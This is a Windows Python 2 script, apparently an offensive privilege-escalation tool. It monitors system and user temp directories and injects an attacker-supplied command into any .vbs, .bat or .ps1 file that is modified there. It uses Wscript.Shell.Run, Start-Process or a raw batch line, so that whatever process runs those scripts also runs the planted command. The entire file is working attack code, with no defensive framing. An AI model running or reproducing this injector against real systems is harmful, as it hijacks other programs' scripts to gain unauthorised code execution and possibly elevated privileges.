import tempfile
import threading
import win32file
import win32con
import os
import sys

watch_Directory = ["C:\\WINDOWS\\Temp", tempfile.gettempdir()]

FILE_CREATED = 1
FILE_DELETED = 2
FILE_MODIFIED = 3
FILE_RENAMED_FROM = 4
FILE_RENAMED_TO = 5

filetype = {}

input = sys.argv[1]

filetype['.vbs'] = ["\r\n'test\r\n", "\r\nCreateObject(\"Wscript.Shell\").Run(\"%s\")\r\n" % input]
filetype['.bat'] = ["\r\nREM test\r\n", "\r\n%s\r\n" % input]
filetype['.ps1'] = ["\r\n#test", "Start-Process \"%s\"" % input]

def injection_Point(full_filename, extension, contents):
    if filetype[extension][0] in contents:
        return
    full_contents = filetype[extension][0]
    full_contents += filetype[extension][1]
    full_contents += contents
    fd = open(full_filename, "wb")
    fd.write(full_contents)
    fd.close()

def initialize_Monitor(path_to_watch):
    FILE_LIST_DIRECTORY = 0x0001
    h_directory = win32file.CreateFile(
        path_to_watch,
        FILE_LIST_DIRECTORY,
        win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE,
        None,
        win32con.OPEN_EXISTING,
        win32con.FILE_FLAG_BACKUP_SEMANTICS,
        None)
    while True:
        try:
            results = win32file.ReadDirectoryChangesW(
                h_directory,
                1024,
                True,
                win32con.FILE_NOTIFY_CHANGE_FILE_NAME |
                win32con.FILE_NOTIFY_CHANGE_DIR_NAME |
                win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |
                win32con.FILE_NOTIFY_CHANGE_SIZE |
                win32con.FILE_NOTIFY_CHANGE_LAST_WRITE |
                win32con.FILE_NOTIFY_CHANGE_SECURITY,
                None,
                None)
            for action, file_name in results:
                full_filename = os.path.join(path_to_watch, file_name)
                if action == FILE_CREATED:
                    print "Created %s" % full_filename
                elif action == FILE_DELETED:
                    print "Deleted %s" % full_filename
                elif action == FILE_MODIFIED:
                    try:
                        fd = open(full_filename,"rb")
                        contents = fd.read()
                        fd.close()
                        print contents
                    except:
                        print "Exception Encountered."
                    filename, extension = os.path.splitext(full_filename)
                    if extension in filetype:
                        injection_Point(full_filename, extension, contents)
                elif action == FILE_RENAMED_FROM:
                    print "Renamed from: %s" % full_filename
                elif action == FILE_RENAMED_TO:
                    print "Renamed to: %s" % full_filename
                else:
                    print "[???] Unknown: %s" % full_filename
        except:
            pass

for path in watch_Directory:
    monitor_thread = threading.Thread(target=initialize_Monitor,args=(path,))
    monitor_thread.start()